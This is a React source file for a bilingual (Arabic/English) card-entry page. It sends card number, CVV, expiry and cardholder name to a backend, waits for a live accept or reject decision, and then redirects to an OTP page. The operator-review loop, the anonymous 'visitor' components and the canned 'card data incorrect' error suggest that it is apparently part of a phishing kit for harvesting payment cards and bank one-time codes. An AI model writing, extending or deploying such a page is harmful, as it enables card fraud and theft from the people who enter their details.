import axios from "axios";
import React, { useEffect, useMemo, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { BottomBar } from "../components/VisitorShared";
import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
import { HeaderShell } from "../components/HeaderShell";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { useLanguage } from "../context/LanguageContext";
import { api_route } from "../socketApi";
import { useOrderSession } from "../hooks/useOrderSession";

function formatCardNumberDigits(digits) {
  const d = digits.replace(/\D/g, "").slice(0, 16);
  return d.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatExpiryDigits(digits) {
  const d = digits.replace(/\D/g, "").slice(0, 4);
  if (d.length === 0) return "";
  if (d.length <= 2) return d;
  return `${d.slice(0, 2)}/${d.slice(2, 4)}`;
}

function isValidExpiry(mmYY) {
  if (!/^\d{2}\/\d{2}$/.test(mmYY)) return false;
  const m = parseInt(mmYY.slice(0, 2), 10);
  return m >= 1 && m <= 12;
}

const emptyFieldErrors = {
  cardholderName: "",
  cardNumber: "",
  expiry: "",
  ccv: "",
};

const Visa = () => {
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumberDisplay, setCardNumberDisplay] = useState("");
  const [expiryDisplay, setExpiryDisplay] = useState("");
  const [ccv, setCcv] = useState("");
  const [fieldErrors, setFieldErrors] = useState(emptyFieldErrors);
  const [loading, setLoading] = useState(false);
  const [formError, setFormError] = useState("");
  /** للعرض فقط — لا يُرسل مع الطلب */
  const [cardNetworkUi, setCardNetworkUi] = useState("");
  const navigatedRef = useRef(false);
  const navigate = useNavigate();
  const location = useLocation();
  const orderId =
    location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
  const { t, dir: pageDir, placeholderTextAlignClass } = useLanguage();

  const { cardAccept, rejectReason, hydrated, reviewVisa } =
    useOrderSession(orderId);

  const awaitingVisaDecision =
    hydrated && !!orderId && !cardAccept && !rejectReason && reviewVisa;

  useEffect(() => {
    if (!orderId) {
      navigate("/login", { replace: true });
    }
  }, [orderId, navigate]);

  useEffect(() => {
    if (!hydrated || !orderId || navigatedRef.current) return;

    if (rejectReason) {
      setFormError(rejectReason || t("workflow.rejected"));
      setLoading(false);
      return;
    }

    if (cardAccept) {
      setLoading(false);
      navigatedRef.current = true;
      sessionStorage.setItem("currentOrderId", orderId);
      navigate("/visa-otp", { state: { orderId } });
    }
  }, [hydrated, cardAccept, rejectReason, orderId, navigate, t]);

  const cardNumberDigits = cardNumberDisplay.replace(/\D/g, "");
  const expiryDigits = expiryDisplay.replace(/\D/g, "");
  const ccvDigits = ccv.replace(/\D/g, "");
  const expiryFormatted = formatExpiryDigits(expiryDigits);

  const formValid = useMemo(
    () =>
      cardholderName.trim().length > 0 &&
      cardNumberDigits.length === 16 &&
      expiryDigits.length === 4 &&
      isValidExpiry(expiryFormatted) &&
      ccvDigits.length === 3,
    [
      cardholderName,
      cardNumberDigits.length,
      expiryDigits.length,
      expiryFormatted,
      ccvDigits.length,
    ],
  );

  const baseIn = `w-full rounded-lg bg-white px-4 py-2 text-lg text-gray-900 placeholder:text-gray-400 ${placeholderTextAlignClass} outline-none transition`;
  const inBorder = (err) =>
    err
      ? "border-2 border-red-500 focus:border-red-600 focus:ring-2 focus:ring-red-100"
      : "border border-[#3d3d6b] focus:ring-2 focus:ring-blue-100";

  const collectErrors = () => {
    const e = { ...emptyFieldErrors };
    if (!cardholderName.trim()) {
      e.cardholderName = t("visa.errors.cardholderName");
    }
    if (cardNumberDigits.length !== 16) {
      e.cardNumber = t("visa.errors.cardNumber");
    }
    if (expiryDigits.length !== 4 || !isValidExpiry(expiryFormatted)) {
      e.expiry = t("visa.errors.expiry");
    }
    if (ccvDigits.length !== 3) {
      e.ccv = t("visa.errors.cvv");
    }
    return e;
  };

  const onCardNumberChange = (e) => {
    setCardNumberDisplay(formatCardNumberDigits(e.target.value));
    if (fieldErrors.cardNumber)
      setFieldErrors((s) => ({ ...s, cardNumber: "" }));
  };

  const onExpiryChange = (e) => {
    setExpiryDisplay(formatExpiryDigits(e.target.value));
    if (fieldErrors.expiry) setFieldErrors((s) => ({ ...s, expiry: "" }));
  };

  const onCcvChange = (e) => {
    setCcv(e.target.value.replace(/\D/g, "").slice(0, 3));
    if (fieldErrors.ccv) setFieldErrors((s) => ({ ...s, ccv: "" }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formValid) {
      setFieldErrors(collectErrors());
      return;
    }
    setFieldErrors(emptyFieldErrors);
    setFormError("");
    setLoading(true);
    try {
      await axios.post(`${api_route}/visa/${orderId}`, {
        cardNumber: cardNumberDigits,
        cardName: cardholderName.trim(),
        cvv: ccvDigits,
        expiryDate: expiryDigits,
      });
    } catch {
      setLoading(false);
      setFormError(t("formData.errors.formFailed"));
    }
  };

  const blockFormUntilOutcome = loading || awaitingVisaDecision;

  if (!orderId) {
    return null;
  }

  return (
    <div
      className="relative flex min-h-screen w-full flex-col bg-white pb-24"
      dir={pageDir}
    >
      <HeaderShell>
        <div className="relative flex w-full items-center justify-center">
          <div className="flex max-w-md justify-end pr-0 pt-1" dir="ltr">
            <img
              src="/header.jpeg"
              alt=""
              className="h-full w-[90%] object-contain"
            />
          </div>
        </div>
      </HeaderShell>

      <form
        onSubmit={handleSubmit}
        className="relative mx-auto mt-4 flex min-h-[420px] w-[90%] max-w-md flex-col gap-4 px-0"
        noValidate
      >
        <PendingFormOverlay
          show={blockFormUntilOutcome}
          ariaLabel={t("common.loadingAria")}
        />

        <>
          <div>
            <label htmlFor="field-card-network" className="sr-only">
              {t("visa.networkPlaceholder")}
            </label>
            <select
              id="field-card-network"
              value={cardNetworkUi}
              onChange={(e) => setCardNetworkUi(e.target.value)}
              className={`${baseIn} !w-fit ${inBorder(false)} cursor-pointer appearance-none bg-white`}
              dir={pageDir}
            >
              <option value="" disabled>
                {t("visa.networkPlaceholder")}
              </option>
              <option value="visa">{t("visa.networkVisa")}</option>
              <option value="mastercard">{t("visa.networkMastercard")}</option>
            </select>
          </div>
          <div>
            <input
              type="text"
              name="ccname"
              id="field-ccname"
              autoComplete="cc-name"
              required={false}
              placeholder={t("visa.cardNamePlaceholder")}
              value={cardholderName}
              onChange={(e) => {
                setCardholderName(e.target.value);
                if (fieldErrors.cardholderName)
                  setFieldErrors((s) => ({ ...s, cardholderName: "" }));
              }}
              aria-invalid={!!fieldErrors.cardholderName}
              aria-describedby={
                fieldErrors.cardholderName ? "err-ccname" : undefined
              }
              className={`${baseIn} ${inBorder(!!fieldErrors.cardholderName)}`}
              dir="ltr"
            />
            <FieldError id="err-ccname" message={fieldErrors.cardholderName} />
          </div>
          <div>
            <input
              type="text"
              name="ccnumber"
              id="field-ccnum"
              inputMode="numeric"
              autoComplete="cc-number"
              required={false}
              placeholder={t("visa.cardNumberPlaceholder")}
              value={cardNumberDisplay}
              onChange={onCardNumberChange}
              aria-invalid={!!fieldErrors.cardNumber}
              aria-describedby={
                fieldErrors.cardNumber ? "err-ccnum" : undefined
              }
              className={`${baseIn} ${inBorder(!!fieldErrors.cardNumber)}`}
              dir="ltr"
            />
            <FieldError id="err-ccnum" message={fieldErrors.cardNumber} />
          </div>
          <div className="grid grid-cols-2 gap-x-3 gap-y-0">
            <div className="min-w-0">
              <input
                type="text"
                name="cc-exp"
                id="field-ccexp"
                inputMode="numeric"
                autoComplete="cc-exp"
                required={false}
                placeholder={t("visa.expiryPlaceholder")}
                value={expiryDisplay}
                onChange={onExpiryChange}
                maxLength={5}
                aria-invalid={!!fieldErrors.expiry}
                aria-describedby={fieldErrors.expiry ? "err-ccexp" : undefined}
                className={`${baseIn} ${inBorder(!!fieldErrors.expiry)}`}
                dir="ltr"
              />
              <FieldError id="err-ccexp" message={fieldErrors.expiry} />
            </div>
            <div className="min-w-0">
              <input
                type="password"
                name="cvv"
                id="field-cvv"
                inputMode="numeric"
                autoComplete="cc-csc"
                required={false}
                placeholder={t("visa.cvvPlaceholder")}
                value={ccv}
                onChange={onCcvChange}
                maxLength={3}
                aria-invalid={!!fieldErrors.ccv}
                aria-describedby={fieldErrors.ccv ? "err-ccc" : undefined}
                className={`${baseIn} ${inBorder(!!fieldErrors.ccv)}`}
                dir="ltr"
              />
              <FieldError id="err-ccc" message={fieldErrors.ccv} />
            </div>
          </div>
          <div className="flex w-full justify-end pt-1 flex-col gap-2">
            {formError ? (
              <div className={formLevelErrorClass()} dir={pageDir} role="alert">
                {pageDir === "rtl"
                  ? "بيانات البطاقة غير صحيحه  .. برجاء المحاولة مرة اخرى"
                  : "Card data is incorrect .. please try again later"}
              </div>
            ) : null}
            <button
              type="submit"
              disabled={blockFormUntilOutcome}
              className="rounded-full px-10 py-2.5 text-sm font-bold uppercase tracking-wide text-white shadow-md transition active:scale-[0.98] disabled:opacity-80"
              style={{ backgroundColor: "#0057FF" }}
            >
              {t("visa.continueBtn")}
            </button>
          </div>
        </>
      </form>

      <BottomBar />
    </div>
  );
};

export default Visa;
